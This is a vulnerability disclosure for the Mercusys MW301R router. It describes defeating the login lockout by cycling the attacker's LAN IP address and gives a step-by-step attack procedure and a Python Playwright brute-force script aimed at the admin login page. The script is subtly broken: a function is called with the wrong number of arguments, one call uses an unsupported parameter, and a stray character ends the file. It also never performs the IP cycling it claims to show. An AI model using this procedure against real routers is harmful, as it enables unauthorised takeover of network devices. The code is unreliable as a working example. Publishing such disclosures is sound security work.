VIDEO POC: https://youtu.be/_t3ZC8zU4-A

Vendor: Mercusys

Product: Router MW301R

Version: 1.0.2 Build 190726 Rel.59423n (4252)

Vulnerability: 7PK Security Features / Brute Force Bypass via IP Cycling

The Mercusys MW301R router implements a basic brute-force protection mechanism that blocks login attempts after a number of failed tries. However, this blocking mechanism is based solely on the source IP address, without enforcing any session fingerprinting, token validation, or advanced rate-limiting / and MAC Address, etc.

An attacker connected to the LAN can simply change their local IP address (e.g., from 192.168.1.10 to 192.168.1.11) after reaching the limit, effectively resetting the login attempt counter.

This allows a brute-force attack to be performed against the admin login page, completely defeating the intended security mechanism.

1 - Set up the attack environment
-Connect to the same local network as the router (192.168.1.1 by default).
![image](https://github.com/user-attachments/assets/1d1d3d49-8e03-4597-8ff3-586f8c3cef1a)

2 - Begin brute-force attempts
-Send login requests with different password values.
-After a few incorrect attempts, the router will begin blocking further tries from that IP.

![image](https://github.com/user-attachments/assets/d5850826-a4f7-49c9-9d65-ca34111a5feb)

3 - Change the local IP to bypass the block
-Update your network interface IP address to a new one within the allowed range.
-Resume brute-force attempts from the new IP address.
![image](https://github.com/user-attachments/assets/220705b5-901c-4773-bd0b-5859c1413289)
![image](https://github.com/user-attachments/assets/4185a0bd-5bac-44b1-9669-7bbe24080dcb)
![image](https://github.com/user-attachments/assets/5e85b2ab-6ab9-4cbf-ad15-ffb9d30ec918)


4 - Repeat the cycle
Each time the IP is rate-limited, change to a different one in the range (192.168.1.4 to 192.168.1.254).




EXPLOIT CODE:


import time
from playwright.sync_api import Playwright, sync_playwright

def carrega_senhas(caminho_arquivo: str) -> list[str]:
    with open(caminho_arquivo, "r", encoding="utf-8") as f:
        return [linha.strip() for linha in f if linha.strip()]

def tenta_login(page, senha: str) -> bool:
    page.goto("http://192.168.1.1/")
    page.get_by_role("textbox", name="Senha de Login").fill(senha)
    page.get_by_role("textbox", name="Senha de Login").press("Enter")
    time.sleep(1)
    try:
        page.get_by_text("Avançado", exact=True, timeout=2000)
        return True
    except:
        return False

def run(playwright: Playwright) -> None:
    browser = playwright.chromium.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()

    senhas = carrega_senhas("senhas.txt", "")
    for idx, senha in enumerate(senhas, 1):
        print(f"[{idx}/{len(senhas)}] Testando senha: {senha!r}")
        if tenta_login(page, senha):
            print(f">>> Sucesso! Senha encontrada: {senha!r}")

            page.get_by_text("Avançado", exact=True).click()
            break
    else:
        print("Nenhuma senha funcionou.")

    context.close()
    browser.close()

if __name__ == "__main__":
    with sync_playwright() as playwright:
        run(playwright)
r 

